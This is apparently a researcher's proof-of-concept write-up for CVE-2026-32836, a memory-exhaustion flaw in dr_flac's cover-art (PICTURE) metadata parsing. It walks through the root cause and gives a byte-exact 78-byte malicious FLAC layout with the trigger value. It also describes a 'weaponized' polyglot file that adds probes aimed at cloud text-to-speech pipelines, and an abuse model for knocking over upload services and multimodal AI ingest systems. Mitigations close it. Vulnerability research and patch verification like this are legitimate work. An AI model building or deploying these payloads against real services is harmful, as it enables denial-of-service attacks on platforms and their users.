# SIREN POLYGLOT v3.0 — Precise CVE-2026-32836 Weaponization

**Timestamp:** 2026-09-23
**Researcher:** frankSx
**Evolution:** v1.0 → v2.0 → v3.0 (corrective release)
**Classification:** Precision PoC — memory-exhaustion DoS in dr_flac PICTURE parsing

---

## Why v3.0 Exists (Correction of Record)

SIREN v2.0 integrated CVE-2026-32836 based on the pre-disclosure summary and
modeled it as *"PADDING blocks containing fake nested headers causing O(n²)
recursive parsing."* The full technical disclosure (dr_libs issue #298,
VulnCheck advisory, 2026-03-17) shows that model was **wrong**:

| v2.0 assumption | Actual finding |
|---|---|
| PADDING block abuse | **PICTURE block** abuse |
| Fake nested headers / recursion | **Single unchecked `malloc()`** |
| O(n²) CPU/parse exhaustion | **O(1) 4 GiB allocation from 78 bytes** |
| Generic FLAC parsers | **dr_flac.h ≤ 0.13.3 only**, metadata-callback path |

v3.0 replaces the speculative vector with the precise, verified one.

---

## The Vulnerability — CVE-2026-32836

**Component:** mackron/dr_libs `dr_flac.h` ≤ 0.13.3
**Function:** `drflac__read_and_decode_metadata()`
**CWE:** CWE-789 — Memory Allocation with Excessive Size Value
**CVSS 4.0:** 6.9 — `AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H`
**Fixed:** commits `fefced4`, `4f5a4cd`, `663239a`
**Credit:** Ana Kapulica (libFuzzer discovery)

### Root Cause, Line by Line

Inside the `DRFLAC_METADATA_BLOCK_TYPE_PICTURE` case (dr_flac.h, v0.13.3):

```c
// line 6748: attacker-controlled value read from the file
metadata.data.picture.mimeLength = drflac__be2host_32(metadata.data.picture.mimeLength);

// line 6750: ALLOCATION HAPPENS FIRST  <-- THE BUG
pMime = (char*)drflac__malloc_from_callbacks(metadata.data.picture.mimeLength + 1, ...);

// line 6756: bounds check happens AFTER
if (blockSizeRemaining < metadata.data.picture.mimeLength || ...) {
    result = DRFLAC_FALSE;
    goto done_flac;
}
```

`blockSizeRemaining` (max ~16 MB, from the 3-byte block-size field) is never
compared against `mimeLength` until **after** the allocation. The identical
ordering mistake repeats at **line 6772** for `descriptionLength`.

The same file already does it correctly for `pictureDataSize` at line 6824 —
this is an ordering inconsistency, not a missing concept.

### Gate Conditions (what is and isn't reachable)

| Entry point | Affected? | Why |
|---|---|---|
| `drflac_open_*_with_metadata()` with `onMeta != NULL` | **YES** | PICTURE body parsed |
| `drflac_open_memory()` / `drflac_open_file()` (no callback) | No | body skipped (line 6728) |

The vulnerable path is exactly the one used by **cover-art extractors,
thumbnail generators, and multimodal/TTS ingest pipelines** — the SIREN
target class.

### Edge case

`mimeLength = 0xFFFFFFFF` wraps `mimeLength + 1` to 0 (`malloc(0)`). Use
`0xFFFFFFFE` for maximum effect: `malloc(0xFFFFFFFF)` ≈ **4 GiB from a
78-byte input** (amplification factor ≈ 55,000,000×).

---

## The PoC Files

### 1. `siren_v3_cve-2026-32836_minimal_78B.flac` (78 bytes)

Byte-exact standalone reproducer:

```
[0x00] 66 4C 61 43          "fLaC"
[0x04] 00 00 00 22          STREAMINFO header (type 0, len 34)
[0x08..0x29] (zeros)        STREAMINFO body
[0x2A] 86 00 00 20          PICTURE header (last | type 6, len 32)
[0x2E] 00 00 00 03          pictureType = 3 (cover front)
[0x32] FF FF FF FE          mimeLength = 0xFFFFFFFE  <-- trigger
[0x36..0x4D] (zeros)        remainder of declared 32-byte body
```

### 2. `siren_v3.0.polyglot.flac` (372 bytes)

Full SIREN lineage preserved: valid FLAC identity + adaptive SSML Vorbis
carrier (Google/AWS/Azure/OpenAI probes from v2) + **dual-stage** PICTURE
block setting *both* `mimeLength` and `descriptionLength` to `0xFFFFFFFE`
(two 4 GiB allocations in one parse → ~8 GiB pressure per file).

### 3. `siren_v3_generator.py`

Regenerates both files; tunable `--mime-length` / `--desc-length`.

### 4. `siren_v3_harness.c`

Vulnerable-target simulator: opens an untrusted upload via
`drflac_open_file_with_metadata()` (the cover-art ingest pattern), with an
ASan malloc hook that aborts on allocations >512 MiB and prints the origin
stack.

```bash
clang -fsanitize=address -O1 -g -o siren_harness siren_v3_harness.c
./siren_harness siren_v3_cve-2026-32836_minimal_78B.flac
```

---

## Expected Outcomes

| Build | Input | Result |
|---|---|---|
| dr_flac ≤ 0.13.3 + ASan | minimal 78B | `malloc(4294967295)` from `dr_flac.h:6750` → ASan abort with symbolized stack |
| dr_flac ≤ 0.13.3, production | minimal 78B | 4 GiB RSS spike per request; repeated uploads → OOM-killer → service DoS |
| dr_flac ≤ 0.13.3, production | polyglot (dual) | ~8 GiB pressure per parse |
| Patched (fefced4+) | any | bounds check fires **before** malloc → `open` returns NULL cleanly |

GDB-verified causation (from issue #298): setting `mimeLength = 100` at
runtime at line 6750 makes the line-6756 check (`blockSizeRemaining=24 < 100`)
fire and the parse exits normally — proving the allocation, not the parse, is
the weapon.

## Real-World Abuse Model

1. Attacker uploads `siren_v3.0.polyglot.flac` to any service that extracts
   FLAC cover art / metadata on ingest (podcast hosts, music platforms,
   multimodal AI pipelines, voice-note transcription with artwork).
2. Service uses dr_flac (embedded in countless apps via dr_libs'
   single-header distribution — no dependency scanner flags it).
3. One request = one 4 GiB allocation. N concurrent uploads = memory
   exhaustion, cgroup OOM-kill, container restart loop.
4. No authentication, no user interaction, no malformed-audio errors — the
   file is a structurally valid FLAC.

## Mitigation

- Upgrade dr_libs past `663239a` / apply the bounds-check-before-malloc fix.
- Enforce RSS limits (cgroup/`ulimit -v`) on ingest workers so a single
  parse cannot take the host down.
- Fuzz your own metadata paths with libFuzzer — this bug was fuzzer-found.

---

*Proof-of-concept for authorized security research and defensive patch
verification only.*
